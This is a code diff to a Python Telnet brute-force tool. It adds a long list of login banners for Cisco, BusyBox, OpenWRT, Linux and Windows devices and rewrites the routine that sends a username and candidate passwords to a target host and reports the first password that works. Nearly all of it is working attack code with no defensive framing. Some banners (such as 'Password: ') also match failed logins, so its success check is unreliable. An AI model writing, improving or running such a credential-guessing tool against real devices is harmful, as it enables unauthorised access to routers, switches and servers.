@@ -13,40 +13,53 @@ RESET = "\033[0m"
 BOLD = "\033[1m"
 
 DEFAULT_PORT = 23
+
+# Expanded banners for different devices and systems
+BANNERS = [
+    "Login the CLI by",          # Your specific success banner
+    "Welcome",                   # Generic success banner
+    "login successful",          # Generic login success
+    "Access granted",            # Generic access granted message
+    "Welcome back",              # Welcome message for repeated login
+    "Login Success",             # Login success variant
+    "Authenticated",             # Authentication success
+    "Connection Established",    # Some devices may use this after successful login
+    "Last login",                # Common Linux/Unix login message
+    "Linux",                     # Banner seen after login on Linux servers
+    "Welcome to Ubuntu",         # Ubuntu login banner
+    "Debian GNU/Linux",          # Debian login banner
+    "Microsoft Windows",         # Windows login banner
+    "Microsoft Windows [Version",# Windows version login banner
+    "Router> ",                  # Router prompt, typically Cisco
+    "Switch> ",                  # Switch prompt, typically Cisco
+    "Enable",                    # Cisco devices after login
+    "Press ENTER to continue",   # Some systems display this after login
+    "BusyBox v",                 # Embedded Linux systems (often in routers)
+    "root@ubuntu",               # Root prompt on Ubuntu
+    "Login as",                  # Common banner for Linux systems
+    "User Access Verification",  # Some Cisco devices after login
+    "Enter password",            # Some routers or switches
+    "Accessing CLI",             # Router or switch access
+    "Enter your password",       # Common message for generic devices
+    "admin#",                    # Common admin prompt on some routers
+    "Login: ",                   # General Linux login prompt
+    "Password: ",                # General password prompt
+    "Welcome to the CLI",        # Generic banner
+    "BusyBox v1.2.1",            # Another variant of embedded Linux
+    "Login successful, type 'help' for a list of available commands",  # Some switches
+    "Telnet login successful",   # Telnet-specific login message
+    "Successful login",          # Generic successful login message
+    "Welcome to OpenWRT",        # OpenWRT routers (Linux-based)
+    "Cisco IOS",                 # Cisco IOS banner
+    "System Login",              # Some switches/routers display this
+]
+
 SUCCESS_BANNER_TEMPLATE = "Login the CLI by {}"
 
 stopTimer = False
 progressLine = ""
 timerThread = None
 stdoutLock = threading.Lock()
-
-# Common success patterns for various devices
-SUCCESS_PATTERNS = [
-    "Login successful",
-    "User Access Verification",
-    "Press Enter to continue",
-    "Welcome to the CLI",
-    "Switch>",  # Cisco switches
-    "Router>",  # Cisco routers
-    "hostname>",  # Generic device prompt
-    ">",  # Generic prompt
-    "#",  # Some devices use a root-level prompt
-    "login:",  # Some devices print "login:" after successful auth
-    "Password:",  # In case there's another password prompt
-    "CLI>",  # Common CLI prompt for various devices
-    "User:",  # Generic user prompt
-    "Login the CLI by",  # Your success banner
-    "Welcome to your system",  # Generic success banner
-    "Network Access Login",  # Generic networking devices
-    "Enter the system",  # Some Unix/Linux-like systems
-    "admin@",  # Some Unix/Linux prompt
-    "root@",  # Some Unix/Linux prompt
-    "Access granted",  # Generic message
-    "Success",  # Very generic
-    "Session started",  # Some systems use this
-    ">>>",  # Python interactive shell prompt
-    ">",  # Many switches and routers have a '>' prompt
-]
 
 def UpdateTimer(startTime):
     while not stopTimer:
@@ -65,7 +78,6 @@ def UpdateTimer(startTime):
 def TelnetBruteForce(host, port, username, passwords):
     global stopTimer, progressLine, timerThread
 
-    successBanner = SUCCESS_BANNER_TEMPLATE.format(username)
     total = len(passwords)
     attempts = 0
 
@@ -84,7 +96,7 @@ def TelnetBruteForce(host, port, username, passwords):
             sys.stdout.write("\r\033[K" + progressLine)
             sys.stdout.flush()
 
-        if TryPassword(host, port, username, pwd, successBanner):
+        if TryPassword(host, port, username, pwd):
             print(f"\n\n{RED}[+] SUCCESS:{RESET} \n{RED}Username: {RESET}{BOLD}{username}{RESET}\n{RED}Password: {RESET}{BOLD}{pwd}{RESET}")
             stopTimer = True
             timerThread.join()
@@ -94,38 +106,54 @@ def TelnetBruteForce(host, port, username, passwords):
     timerThread.join()
     print(f"\n\n{RED}[-] No valid password found.{RESET}")
 
-def TryPassword(host, port, username, password, successBanner):
+def TryPassword(host, port, username, password):
     try:
-        sock = socket.socket()
+        # Create socket and connect to target
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(5)
         sock.connect((host, port))
 
+        # Read until we get 'User:' prompt (Telnet)
+        sock.send(b"\r\n")  # Send an initial newline to get the prompt
+        time.sleep(0.2)  # Wait for the prompt to come back
+        data = sock.recv(1024).decode(errors="ignore")  # Decode bytes to string
+
+        if "User:" not in data:
+            sock.close()
+            return False
+
         # Send username
         sock.send((username + "\r\n").encode())
-        data = sock.recv(1024).decode(errors="ignore")
-        
-        # Wait for Password prompt
+        time.sleep(0.2)  # Give some time for the prompt to come back
+
+        # Expecting password prompt
+        data = sock.recv(1024).decode(errors="ignore")  # Decode bytes to string
         if "Password:" not in data:
+            sock.close()
             return False
 
         # Send password
         sock.send((password + "\r\n").encode())
-        data = sock.recv(1024).decode(errors="ignore")
-        
-        # Check if any of the success patterns are in the response
-        for pattern in SUCCESS_PATTERNS:
-            if pattern in data:
-                return True
-        
-        return False
+        time.sleep(0.2)
 
+        # Get the output after sending the password
+        output = sock.recv(1024).decode(errors="ignore")  # Decode bytes to string
+        sock.close()
+
+        # Check if any of the success banners are in the output
+        for banner in BANNERS:
+            if banner in output:
+                return True
+
+        return False
     except Exception as e:
-        print(f"[!] Error during password attempt: {e}")
+        print(f"[!] Error: {e}")
         return False
     finally:
         try:
             sock.close()
-        except: pass
+        except:
+            pass
 
 def LoadPasswords(path):
     try:
